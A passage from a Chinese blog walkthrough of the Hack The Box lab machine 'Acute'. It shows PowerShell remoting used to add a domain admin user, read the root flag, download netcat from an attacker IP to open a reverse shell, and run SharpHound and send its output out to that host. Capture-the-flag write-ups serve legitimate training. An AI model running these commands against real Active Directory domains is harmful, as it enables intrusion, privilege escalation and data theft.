<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock &#123;  net user awallace /domain&#125;</span><br><span class="line">User name                    awallace</span><br><span class="line">Full Name                    Aileen Wallace</span><br><span class="line">Comment                                                                                          </span><br><span class="line">User&#x27;s comment                     </span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes                                                                                                                                                                   </span><br><span class="line">Account expires              Never                                                                                                                                                                 </span><br><span class="line">                                                </span><br><span class="line">Password last set            21/12/2021 14:50:36 </span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          22/12/2021 14:50:36 </span><br><span class="line">Password required            Yes                                                                 </span><br><span class="line">User may change password     Yes</span><br><span class="line">                                                </span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                                                                                     </span><br><span class="line">User profile                      </span><br><span class="line">Home directory                                                                                   </span><br><span class="line">Last logon                   14/03/2025 14:29:59 </span><br><span class="line">                                                </span><br><span class="line">Logon hours allowed          All</span><br><span class="line">                                                </span><br><span class="line">Local Group Memberships      </span><br><span class="line">Global Group memberships     *Domain Users         *Managers             </span><br><span class="line">                             *Site_Admin            </span><br><span class="line">The command completed successfully. </span><br></pre></td></tr></table></figure>

<p>猜测这个<code>lois</code>用户应该是被加了dacl之类的奇怪权限，允许他添加用户至<code>site_admin</code>组，而又没有其他组的添加权限</p>
<p>试了一会发现他权限会刷新，赶紧趁着还有<code>site_admin</code>权限，加个用户</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span>  <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-scriptblock</span> &#123;net user flower Password@<span class="number">123</span> /add /domain&#125; </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> ATSSERVER <span class="literal">-Credential</span> <span class="variable">$cred</span>  <span class="literal">-ConfigurationName</span> dc_manage <span class="literal">-scriptblock</span> &#123; net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> flower /add /domain &#125;</span><br></pre></td></tr></table></figure>

<p>然后用新加的用户执行命令时候就不用带<code>-ConfigurationName</code>了，不然也会报权限不足</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred  -ScriptBlock &#123; ls ~ &#125;</span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred  -ScriptBlock &#123; ls ~ &#125;</span><br><span class="line">[ATSSERVER] Connecting to remote server ATSSERVER failed with the following error message : Access is denied. For more </span><br><span class="line">information, see the about_Remote_Troubleshooting Help topic.</span><br><span class="line">    + CategoryInfo          : OpenError: (ATSSERVER:String) [], PSRemotingTransportException</span><br><span class="line">    + FullyQualifiedErrorId : AccessDenied,PSSessionStateBroken</span><br></pre></td></tr></table></figure>

<p>登录执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; $passwd = ConvertTo-SecureString &quot;Password@123&quot; -AsplainText -Force</span><br><span class="line">$passwd = ConvertTo-SecureString &quot;Password@123&quot; -AsplainText -Force</span><br><span class="line">PS C:\utils&gt; $cred = New-Object System.Management.Automation.PSCredential(&quot;acute\flower&quot;,$passwd)</span><br><span class="line">$cred = New-Object System.Management.Automation.PSCredential(&quot;acute\flower&quot;,$passwd)</span><br><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -Credential $cred  -ScriptBlock &#123; ls ~ &#125;</span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential $cred  -ScriptBlock &#123; ls ~ &#125;</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\flower</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name                               PSComputerName                    </span><br><span class="line">----                 -------------         ------ ----                               --------------                    </span><br><span class="line">d-r---        15/09/2018     08:12                Desktop                            ATSSERVER                         </span><br><span class="line">d-r---        11/03/2025     15:10                Documents                          ATSSERVER                         </span><br><span class="line">d-r---        15/09/2018     08:12                Downloads                          ATSSERVER                         </span><br><span class="line">d-r---        15/09/2018     08:12                Favorites                          ATSSERVER                         </span><br><span class="line">d-r---        15/09/2018     08:12                Links                              ATSSERVER                         </span><br><span class="line">d-r---        15/09/2018     08:12                Music                              ATSSERVER                         </span><br><span class="line">d-r---        15/09/2018     08:12                Pictures                           ATSSERVER                         </span><br><span class="line">d-----        15/09/2018     08:12                Saved Games                        ATSSERVER                         </span><br><span class="line">d-r---        15/09/2018     08:12                Videos                             ATSSERVER                         </span><br></pre></td></tr></table></figure>

<p>拿一下flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock &#123; cat \users\administrator\desktop\root*&#125;</span><br><span class="line">283d1a4d4afc079410a74a9f5529e413</span><br></pre></td></tr></table></figure>

<p>过了一会发现权限又被刷新了，真服了。</p>
<p>等了一会又拿到权限，这次直接用<code>awallace</code>用户了，还是要注意一样的问题，高权之后不需要再只定<code>ConfigurationName</code>了，不然会限制自己执行的命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123; curl 10.10.16.8/nc64.exe -o C:/a.exe&#125;</span><br><span class="line">Invoke-Command -ComputerName ATSSERVER -Credential $cred -ConfigurationName dc_manage  -ScriptBlock &#123; curl 10.10.16.8/nc64.exe -o C:/a.exe&#125;</span><br><span class="line">The term &#x27;curl.exe&#x27; is not recognized as the name of a cmdlet, function, script file, or operable program. Check the </span><br><span class="line">spelling of the name, or if a path was included, verify that the path is correct and try again.</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (curl.exe:String) [], CommandNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : CommandNotFoundException</span><br><span class="line">    + PSComputerName        : ATSSERVER</span><br></pre></td></tr></table></figure>

<p>传个nc到<code>ATSSERVER</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt; Invoke-Command -ComputerName ATSSERVER -Credential $cred  -ScriptBlock &#123; curl 10.10.16.8/nc64.exe -o C:/a.exe&#125;</span><br></pre></td></tr></table></figure>

<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\utils&gt;Invoke-Command -ComputerName ATSSERVER -Credential $cred  -ScriptBlock &#123; C:/a.exe 10.10.16.8 10088 -e powershell&#125;</span><br></pre></td></tr></table></figure>

<p>终于拿到<code>ATSSERVER</code>机器上的shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">─$ nc -lvnp 10088</span><br><span class="line">listening on [any] 10088 ...</span><br><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.10.11.145] 57496</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\Users\awallace\Documents&gt; whoami</span><br><span class="line"></span><br><span class="line">acute\awallace</span><br></pre></td></tr></table></figure>

<p>进来之后看389是开着的外面却连不到，遛个狗看下这个破域到底啥情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\awallace\Documents&gt; netstat -ano|findstr 389</span><br><span class="line">netstat -ano|findstr 389</span><br><span class="line">  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       680</span><br><span class="line">  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2444</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.16.8/SharpHound.exe -o SharpHound.exe</span><br><span class="line">PS C:\Users\awallace\Documents&gt; .\SharpHound.exe</span><br><span class="line">.\SharpHound.exe</span><br><span class="line">2025-03-11T15:38:19.5992713+00:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound</span><br><span class="line">2025-03-11T15:38:19.6773937+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line">2025-03-11T15:38:19.6930183+00:00|INFORMATION|Initializing SharpHound at 15:38 on 11/03/2025</span><br><span class="line">2025-03-11T15:38:19.7867734+00:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for acute.local : ATSSERVER.acute.local</span><br><span class="line">2025-03-11T15:38:19.8023986+00:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line">2025-03-11T15:38:19.8962192+00:00|INFORMATION|Beginning LDAP search for acute.local</span><br><span class="line">2025-03-11T15:38:19.9117741+00:00|INFORMATION|Producer has finished, closing LDAP channel</span><br><span class="line">2025-03-11T15:38:19.9117741+00:00|INFORMATION|LDAP channel closed, waiting for consumers</span><br><span class="line">2025-03-11T15:38:50.2656371+00:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM</span><br><span class="line">2025-03-11T15:39:03.4265787+00:00|INFORMATION|Consumers finished, closing output channel</span><br><span class="line">Closing writers</span><br><span class="line">2025-03-11T15:39:03.4422041+00:00|INFORMATION|Output channel closed, waiting for output task to complete</span><br><span class="line">2025-03-11T15:39:03.4890789+00:00|INFORMATION|Status: 113 objects finished (+113 2.627907)/s -- Using 43 MB RAM</span><br><span class="line">2025-03-11T15:39:03.4890789+00:00|INFORMATION|Enumeration finished in 00:00:43.6059014</span><br><span class="line">2025-03-11T15:39:03.5515810+00:00|INFORMATION|Saving cache with stats: 72 ID to type mappings.</span><br><span class="line"> 75 name to SID mappings.</span><br><span class="line"> 0 machine sid mappings.</span><br><span class="line"> 2 sid to domain mappings.</span><br><span class="line"> 0 global catalog mappings.</span><br><span class="line">2025-03-11T15:39:03.5515810+00:00|INFORMATION|SharpHound Enumeration Completed at 15:39 on 11/03/2025! Happy Graphing!</span><br></pre></td></tr></table></figure>

<p>传出去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\awallace\Documents&gt; cmd /c curl -T ./20250311153902_BloodHound.zip  10.10.16.8:81</span><br><span class="line">cmd /c curl -T ./20250311153902_BloodHound.zip  10.10.16.8:81</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 13348    0     0  100 13348      0   2832  0:00:04  0:00:04 --:--:--  2832</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvnp 81 &gt; blood.zip  </span><br><span class="line">listening on [any] 81 ...</span><br><span class="line">connect to [10.10.16.8] from (UNKNOWN) [10.10.11.145] 57555</span><br></pre></td></tr></table></figure>

<p>再删一下req带的的头信息</p>
<p>导进狗里，我倒要看看这个lois是什么东西</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-16.png" alt="alt text"></p>
<p>找到<code>lhopkins</code>，可恶居然是对<code>site_admin</code>有<code>genericAll</code>,给他baby完辽。</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-17.png" alt="alt text"></p>
<p>再看<code>site_admin</code>，这位更是<code>domain admins</code>儿子，那没事了</p>
<p><img src="/wpimages/2025/tracks-ad/Acute/image-18.png" alt="alt text"></p>
<p><code>lhopkins</code>对<code>site_admin</code>有<code>genericAll</code>，这也就说得通为啥他只能加用户到site_admin里了。</p>
<hr>
<p>不错的靶机，但是靶机作者最后的操作太傻逼了，而且给留的lois相关讯息也是看的一团雾水很容易就走歪了，一半靠猜，太弱智了.</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/03/19/box-wp-TheFrizz/"
      title="【season-7】 htb TheFrizz wp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        【season-7】 htb TheFrizz wp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/03/03/box-wp-Cypher/"
      title="【season-7】 htb Cypher wp"
     >

    <p class="title-text">
      
        【season-7】 htb Cypher wp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
